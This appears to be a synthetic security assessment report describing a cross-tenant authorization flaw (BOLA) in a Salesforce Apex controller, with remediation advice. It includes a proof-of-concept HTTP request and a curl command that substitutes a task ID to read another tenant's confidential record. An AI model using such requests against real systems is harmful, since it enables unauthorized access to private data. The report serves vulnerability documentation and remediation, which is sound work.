# Security Analysis Report
**System:** BuildCore BIM Collaboration (Salesforce-Integrated)
**Domain:** Construction / BIM Platform
**Example ID:** SF-0078
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BOLA — Pattern 1.5 | Multi-tenant cross-tenant access on `TaskController.getTask` — attacker reads any BIM Task record across tenant boundaries |

---

## Finding 1 — BOLA: Multi-Tenant Cross-Tenant Access on Task Object (Pattern 1.5)

### Summary
The Apex controller `TaskController` on BuildCore BIM Collaboration (`414402d2.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Task object. Per §5.0 Pattern 1.5, there is no tenant isolation predicate, enabling cross-tenant data access. An attacker with a valid session can read any Task record by substituting `taskId`.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getTaskDetails(String taskId, ...)` while the Aura descriptor in §6.0 is `c.TaskController.getTask`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 1.5 — Multi-tenant / cross-tenant access (BOLA)
**Affected controller:** `c.TaskController.getTask`
**Affected endpoint:** `POST https://414402d2.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://414402d2.lightning.force.com/aura
Authorization: Bearer 00D414402D2!AR414402d2...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D414402D2!AR414402d2...

message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN",
"params":{"taskId":"00102D2","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Task Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "00102D2", "Name": "Victim Task Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-24-8721"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D414402D2!AR414402d2..."
curl -s -X POST "https://414402d2.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.TaskController.getTask","callingDescriptor":"UNKNOWN","params":{"taskId":"00102D2","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-24-8721
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class TaskController { ... }`
2. `WHERE Id = :taskId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
